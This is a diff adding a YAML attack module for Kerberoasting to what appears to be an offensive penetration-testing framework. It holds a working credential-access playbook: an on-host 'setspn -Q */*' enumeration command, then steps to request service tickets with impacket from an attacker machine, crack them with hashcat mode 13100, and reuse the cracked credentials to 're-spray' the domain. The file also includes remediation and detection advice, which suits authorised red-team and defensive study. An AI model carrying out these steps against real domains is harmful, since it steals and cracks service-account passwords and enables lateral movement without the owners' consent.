@@ -1,0 +1,78 @@
+# Kerberoasting — SPN enumeration + roast-route surface
+#
+# Any authenticated domain user can request a service ticket (TGS)
+# for any account with a Service Principal Name — the KDC hands
+# back a ticket whose encrypted portion is encrypted with the
+# service account's NTLM hash. That hash cracks offline; when the
+# service account uses a weak password (they usually do — humans
+# write those service-account passwords), cracking is fast enough
+# to be reliable.
+#
+# The on-host command enumerates SPN-carrying accounts via
+# setspn — telling the operator WHICH accounts are worth roasting
+# before firing `fieldkit roast --kind kerberoast` attacker-side.
+# The playbook covers the roast handoff.
+#
+# Genuinely new coverage — fieldkit had the `roast` CLI but no
+# TTP surface for it, so it never appeared in analyze / TOP MOVES.
+technique: T1558.003
+name: Kerberoasting — SPN enumeration → offline hash cracking
+tactic: [credential-access]
+platform: [windows]
+key: adroute:kerberoast
+ranking:
+  exploitability: high            # AD Kerberoasting is the highest-hit AD move most days
+  safety: read-only               # TGS-REQ is normal Kerberos traffic; no state change
+  detection: quiet                 # unless 4769 volume is tuned as a detection
+detect:
+  # Every authenticated domain user is in "Domain Users" by default.
+  # Matching this group is fieldkit's proxy for "we're on a domain."
+  # (Localized DCs may use a non-English group name; the operator
+  # can extend win_groups matching in a future slice.)
+  group_member: Domain Users
+execute:
+  # setspn ships in Windows since 2003. -Q */* queries all SPNs in
+  # the domain — the output is the roast target list.
+  # `2>&1` catches "no principals found" so the loop doesn't
+  # false-fail; the output either has SPN lines or an error.
+  command: |-
+    setspn -Q */* 2>&1
+verify:
+  # Any non-krbtgt SPN line contains a slash (service class/host).
+  success: "/"
+cleanup:
+  command: ""
+report:
+  vector_type: kerberoast
+  evidence: "on a domain (Domain Users); SPN accounts enumerable"
+  description: >
+    Kerberoasting exploits the Kerberos protocol as designed: any
+    domain user can request a TGS for any SPN, and the TGS's
+    encrypted portion is symmetrically encrypted with the target
+    service account's NTLM hash — which cracks offline. Weak
+    service-account passwords are the norm (they're set once, at
+    account creation, and rarely rotated), so cracking is fast
+    enough to be a reliable next-move on almost every AD.
+  remediation: >
+    Set service accounts to AES-only encryption
+    (`msDS-SupportedEncryptionTypes = 0x18`) — the AES ticket is
+    still crackable but the throughput drops by 10-100x. Enforce
+    Group Managed Service Accounts (gMSA) where possible; gMSA
+    passwords are 240-byte random values rotated automatically
+    and are computationally infeasible to crack. Monitor 4769
+    events for unusual TGS-REQ volume from a single principal.
+  refs: [T1558.003, kerberoasting]
+playbook:
+  summary: >
+    Domain foothold + weak service-account passwords → roast.
+    Prepare-only from fieldkit's side (the roast fires from the
+    operator's Kali via impacket-GetUserSPNs, not from the target
+    box, so the target's auth.log stays clean).
+  place: 'attacker-side (impacket)'
+  steps:
+    - "review the on-host SPN enum output — non-krbtgt SPNs point at real service accounts"
+    - "add a DC to state if not already: `fieldkit add hosts <dc-ip> --dc`"
+    - "add the domain credential: `fieldkit add cred 'DOMAIN/user:pass'`"
+    - "run `fieldkit roast --kind kerberoast` — the recovered hashes land in loot"
+    - "crack offline with hashcat -m 13100 (fast on the weak passwords service accounts usually get); re-add cracked creds with `fieldkit add cred` to re-spray"
+  restore: ""
